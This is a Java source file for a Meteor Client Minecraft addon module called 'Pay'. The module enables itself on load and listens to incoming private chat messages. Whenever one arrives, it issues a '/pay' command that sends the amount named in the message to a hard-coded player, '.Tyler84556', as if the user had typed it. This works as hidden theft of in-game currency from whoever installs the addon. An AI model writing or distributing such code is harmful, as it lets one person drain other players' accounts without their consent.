package com.example.addon.modules;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.game.ReceiveMessageEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;

public class Pay extends Module {
    private final MinecraftClient mc = MinecraftClient.getInstance();

    public Pay() {
        super(AddonTemplate.CATEGORY, "Pay Module", "Automatically pays .Tyler84556 when you receive a message.");
        toggle(); // Enable on load
        MeteorClient.EVENT_BUS.subscribe(this);
    }

    @EventHandler
    private void onChat(ReceiveMessageEvent event) {
        String raw = event.getMessage().getString();

        // Print chat for debugging
        System.out.println("[Pay Module] Chat: " + raw);

        int index = raw.indexOf(" -> YOU:");
        if (index != -1) {
            String amount = raw.substring(index + " -> YOU:".length()).trim();

            if (!amount.isEmpty()) {
                String command = "/pay .Tyler84556 " + amount;
                System.out.println("[Pay Module] Sending command: " + command);

                ChatUtils.sendPlayerMsg(command);  // Sends the command like the player typed it
            }
        }
    }
}
